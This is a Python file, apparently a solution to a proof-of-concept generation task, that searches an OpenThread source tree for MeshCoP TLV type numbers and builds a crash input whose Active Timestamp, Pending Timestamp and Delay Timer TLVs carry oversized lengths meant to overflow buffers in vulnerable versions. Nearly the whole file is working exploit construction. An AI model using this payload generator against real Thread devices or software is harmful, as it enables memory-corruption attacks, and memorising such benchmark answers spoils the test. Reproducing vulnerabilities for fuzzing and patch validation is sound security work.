import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        def extract_tarball(tar_path: str) -> str:
            tmpdir = tempfile.mkdtemp(prefix="src_")
            try:
                with tarfile.open(tar_path, "r:*") as tf:
                    def is_within_directory(directory, target):
                        
                        abs_directory = os.path.abspath(directory)
                        abs_target = os.path.abspath(target)
                    
                        prefix = os.path.commonprefix([abs_directory, abs_target])
                        
                        return prefix == abs_directory
                    
                    def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                    
                        for member in tar.getmembers():
                            member_path = os.path.join(path, member.name)
                            if not is_within_directory(path, member_path):
                                raise Exception("Attempted Path Traversal in Tar File")
                    
                        tar.extractall(path, members, numeric_owner=numeric_owner) 
                        
                    
                    safe_extract(tf, path=tmpdir)
            except Exception:
                pass
            return tmpdir

        def iter_code_files(root_dir: str):
            for r, _, files in os.walk(root_dir):
                for fn in files:
                    if fn.endswith((".h", ".hpp", ".hh", ".hxx", ".c", ".cc", ".cpp", ".cxx", ".ipp", ".inc")):
                        full = os.path.join(r, fn)
                        try:
                            with open(full, "rb") as f:
                                data = f.read()
                            # Try utf-8 first, fallback to latin1
                            try:
                                txt = data.decode("utf-8", errors="ignore")
                            except Exception:
                                txt = data.decode("latin1", errors="ignore")
                            yield full, txt
                        except Exception:
                            continue

        def parse_tlv_types(root_dir: str):
            # Attempt to find numeric constants for TLV types
            # Return mapping for 'active', 'pending', 'delay'
            types = {"active": None, "pending": None, "delay": None}
            # Regex for direct numeric assignments in enums/consts
            pat = re.compile(r'\b(kActiveTimestamp|kPendingTimestamp|kDelayTimer)\s*=\s*(0x[0-9A-Fa-f]+|\d+)', re.M)
            # Alternative: search ActiveTimestampTlv::kType = <number>
            pat2 = re.compile(r'\bActiveTimestampTlv\b[^{;]*?\bkType\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)', re.M)
            pat3 = re.compile(r'\bPendingTimestampTlv\b[^{;]*?\bkType\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)', re.M)
            pat4 = re.compile(r'\bDelayTimerTlv\b[^{;]*?\bkType\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)', re.M)
            # If using enum mapping with Tlv::Type names, try to find them
            pat_enum = re.compile(r'enum\s+(?:class\s+)?Type\s*:\s*uint8_t\s*{([^}]*)}', re.S)

            for _, txt in iter_code_files(root_dir):
                # Direct numeric assignments
                for m in pat.finditer(txt):
                    name, val = m.group(1), m.group(2)
                    try:
                        v = int(val, 0)
                    except Exception:
                        continue
                    if name == "kActiveTimestamp":
                        types["active"] = v
                    elif name == "kPendingTimestamp":
                        types["pending"] = v
                    elif name == "kDelayTimer":
                        types["delay"] = v
                # Per-TLV kType numeric
                m2 = pat2.search(txt)
                if m2:
                    try:
                        v = int(m2.group(1), 0)
                        types["active"] = v
                    except Exception:
                        pass
                m3 = pat3.search(txt)
                if m3:
                    try:
                        v = int(m3.group(1), 0)
                        types["pending"] = v
                    except Exception:
                        pass
                m4 = pat4.search(txt)
                if m4:
                    try:
                        v = int(m4.group(1), 0)
                        types["delay"] = v
                    except Exception:
                        pass
                # Enum block heuristic
                for me in pat_enum.finditer(txt):
                    body = me.group(1)
                    # Try to map enumerators possibly with numeric assignments
                    # We'll still use simple assignment parser within the body
                    for line in body.split(","):
                        line = line.strip()
                        if not line:
                            continue
                        m = re.match(r'(kActiveTimestamp|kPendingTimestamp|kDelayTimer)\s*(?:=\s*(0x[0-9A-Fa-f]+|\d+))?', line)
                        if m:
                            name = m.group(1)
                            val = m.group(2)
                            if val:
                                try:
                                    v = int(val, 0)
                                    if name == "kActiveTimestamp":
                                        types["active"] = v
                                    elif name == "kPendingTimestamp":
                                        types["pending"] = v
                                    elif name == "kDelayTimer":
                                        types["delay"] = v
                                except Exception:
                                    pass
            # Fallback guesses commonly used by OpenThread MeshCoP
            if types["active"] is None:
                types["active"] = 14
            if types["pending"] is None:
                # Often 51? 15? In OpenThread it's usually 15 for Pending Timestamp TLV in MeshCoP
                types["pending"] = 15
            if types["delay"] is None:
                # Delay Timer TLV in MeshCoP Pending Dataset is commonly 52 in Thread 1.1 spec (0x34)
                # If not correct, this TLV can be omitted; the crash should still trigger via ActiveTimestamp.
                types["delay"] = 52
            return types

        def detect_uses_dataset_struct(root_dir: str) -> bool:
            # Try to identify if fuzz target passes otOperationalDatasetTlvs to API
            # Heuristic: if within any LLVMFuzzerTestOneInput file there is "otOperationalDatasetTlvs"
            # referenced, assume the input starts with a uint16_t length field.
            has_struct_reference = False
            fuzzer_files = []
            for path, txt in iter_code_files(root_dir):
                if "LLVMFuzzerTestOneInput" in txt:
                    fuzzer_files.append((path, txt))
            if not fuzzer_files:
                return False
            for _, txt in fuzzer_files:
                if "otOperationalDatasetTlvs" in txt:
                    has_struct_reference = True
                    break
                # Also if they call otDatasetSetActiveTlvs or SetPendingTlvs, they likely use the struct
                if re.search(r'\botDatasetSet(Active|Pending)Tlvs\b', txt):
                    has_struct_reference = True
                    break
            return has_struct_reference

        def build_tlv(type_id: int, length: int, len_size: int = 1, value_byte: int = 0x41) -> bytes:
            if length < 0:
                length = 0
            value = bytes([value_byte]) * length
            if len_size == 1:
                return bytes([type_id & 0xFF, length & 0xFF]) + value
            # Assume big-endian for 2-byte length if ever used
            return bytes([type_id & 0xFF, (length >> 8) & 0xFF, length & 0xFF]) + value

        # Extract and analyze source to make our PoC more robust across versions/targets
        root = extract_tarball(src_path)
        tlv_types = parse_tlv_types(root)
        uses_struct = detect_uses_dataset_struct(root)

        # We'll assume MeshCoP TLVs have 1-byte length fields.
        len_size = 1

        # Craft TLVs with over-sized lengths specifically for Active/Pending Timestamp and Delay Timer
        # - ActiveTimestamp expected length: 8; we set to 200 to force large overflow in vulnerable versions
        # - PendingTimestamp expected length: 8; we set to 64
        # - DelayTimer expected length: 4; we set to 40
        # Using multiple TLVs increases the chance to trigger via any code path that parses either active or pending datasets.
        tlvs = []
        tlvs.append(build_tlv(tlv_types["active"], 200, len_size=len_size, value_byte=0x42))
        tlvs.append(build_tlv(tlv_types["pending"], 64, len_size=len_size, value_byte=0x43))
        # DelayTimer may not be recognized in some paths; include but overflow not necessary to trigger vulnerability
        tlvs.append(build_tlv(tlv_types["delay"], 40, len_size=len_size, value_byte=0x44))

        payload = b"".join(tlvs)

        if uses_struct:
            # Prepend struct length (uint16_t little-endian) as otOperationalDatasetTlvs::mTlvsLength
            tlvs_len = len(payload)
            # Ensure length fits uint16_t
            tlvs_len &= 0xFFFF
            prefix = bytes([tlvs_len & 0xFF, (tlvs_len >> 8) & 0xFF])
            payload = prefix + payload

        # Ensure payload is not empty and reasonable length
        if not payload:
            # Fallback minimal PoC: ActiveTimestamp TLV only
            payload = build_tlv(14, 16, len_size=1, value_byte=0x41)

        return payload